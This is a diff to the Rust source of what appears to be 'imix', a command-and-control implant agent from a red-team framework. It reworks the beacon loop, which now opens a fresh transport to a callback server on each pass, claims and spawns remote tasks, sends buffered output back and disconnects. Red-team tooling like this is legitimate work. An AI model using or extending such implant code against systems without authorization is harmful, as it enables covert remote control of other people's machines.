@@ -1,6 +1,6 @@
 extern crate alloc;
 
-use anyhow::{Context, Result};
+use anyhow::Result;
 use std::sync::Arc;
 use std::time::Duration;
 use tokio::time::sleep;
@@ -34,8 +34,8 @@ async fn main() -> Result<()> {
     // Load config / defaults
     let config = Config::default_with_imix_verison(VERSION);
 
-    let transport = ActiveTransport::new(config.callback_uri.clone(), None)
-        .context("Failed to initialize transport")?;
+    // Initial transport is just a placeholder, we create active ones in the loop
+    let transport = ActiveTransport::init();
 
     let handle = tokio::runtime::Handle::current();
     let task_registry = TaskRegistry::new();
@@ -47,18 +47,43 @@ async fn main() -> Result<()> {
     ));
 
     loop {
-        match agent.fetch_tasks().await {
-            Ok(tasks) => {
-                if tasks.is_empty() {
-                    log::info!("Callback success, no tasks to claim")
+        // Refresh IP
+        agent.refresh_ip().await;
+
+        // Create new active transport
+        let (callback_uri, proxy_uri) = agent.get_transport_config().await;
+
+        let active_transport_result = ActiveTransport::new(callback_uri, proxy_uri);
+
+        match active_transport_result {
+            Ok(transport) => {
+                // Set transport
+                agent.update_transport(transport).await;
+
+                // Claim Tasks
+                match agent.fetch_tasks().await {
+                    Ok(tasks) => {
+                        if tasks.is_empty() {
+                            log::info!("Callback success, no tasks to claim")
+                        }
+                        for task in tasks {
+                            log::info!("Claimed task: {}", task.id);
+                            task_registry.spawn(task, agent.clone());
+                        }
+                    }
+                    Err(e) => {
+                        log::error!("Callback failed: {e:#}");
+                    }
                 }
-                for task in tasks {
-                    log::info!("Claimed task: {}", task.id);
-                    task_registry.spawn(task, agent.clone());
-                }
+
+                // Flush Outputs (send all buffered output)
+                agent.flush_outputs().await;
+
+                // Disconnect (drop transport)
+                agent.update_transport(ActiveTransport::init()).await;
             }
             Err(e) => {
-                log::error!("Callback failed: {e:#}");
+                log::error!("Failed to create transport: {e:#}");
             }
         }
 
